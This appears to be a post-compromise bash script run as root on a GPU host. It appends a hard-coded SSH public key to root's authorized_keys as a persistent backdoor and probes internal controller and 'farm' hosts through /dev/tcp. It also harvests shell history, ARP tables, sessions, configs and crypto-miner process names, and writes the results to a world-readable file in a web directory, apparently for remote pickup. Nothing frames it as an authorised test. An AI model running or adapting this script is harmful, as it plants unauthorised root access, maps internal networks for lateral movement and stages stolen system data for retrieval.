#!/bin/bash
umask 022
O=/opt/t19/www/ul5817_a.txt
{
echo "=== UL5817-A $(date -u +%FT%TZ) host=$(hostname)"
echo "--- ID"; id; uname -a
echo "--- AUTHKEYS"; ls -la /root/.ssh/ 2>&1; echo "--- content"; cat /root/.ssh/authorized_keys 2>&1 | sed -E 's/(AAAA[A-Za-z0-9+\/=]{20})[A-Za-z0-9+\/=]*/\1…/' 
echo "--- ADD-KEY"
mkdir -p /root/.ssh; chmod 700 /root/.ssh
K='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMNt5Z3qbsp46RAfAf1BxL3Fg0JHo9JUqtP9cKNVh/cp ul5817-g0023'
grep -q 'ul5817-g0023' /root/.ssh/authorized_keys 2>/dev/null || echo "$K" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
grep -c 'ul5817' /root/.ssh/authorized_keys
echo "--- CTL-PROBE"
for H in 192.168.0.24 192.168.0.20 192.168.0.1 192.168.0.30; do
  timeout 2 bash -c "cat < /dev/null > /dev/tcp/$H/22" 2>/dev/null && echo "CTL $H:22 OPEN" || echo "CTL $H:22 FAIL"
done
echo "--- FARM-PROBE"
for H in 172.16.10.1 172.16.10.71 172.16.11.13 172.16.11.1 172.16.10.76; do
  for P in 22 9400 11398; do
    timeout 2 bash -c "cat < /dev/null > /dev/tcp/$H/$P" 2>/dev/null && echo "FARM $H:$P OPEN" || true
  done
done
echo "FARM-PROBE-DONE"
echo "--- NEIGH"; ip neigh | head -20
echo "--- ARP"; arp -an 2>/dev/null | head -20
echo "--- CONF172"; grep -nE '172\.16\.1[01]\.' /root/conf/* 2>/dev/null | head -20
echo "--- HIST"; grep -nE 'ssh |scp |rsync|172\.16|10\.20|mount |ping |vlan' /root/.bash_history 2>/dev/null | tail -40
echo "--- SESS"; ss -tnp 2>/dev/null | head -25
echo "--- SSD"; ls /ssd 2>/dev/null; ls -la /ssd/vendors 2>/dev/null | head -10
echo "--- TIMERS"; systemctl list-timers --all 2>/dev/null | grep -iE 't19|ul|bcm' | head -10
echo "--- PROCS"; pgrep -fa 'wildrig|krig|plh|sup2|run.sh' 2>/dev/null | head -15
echo "--- GPU"; nvidia-smi -L 2>&1 | head -10
echo "=== END-A"
} > $O 2>&1
chmod 644 $O
ls -l $O
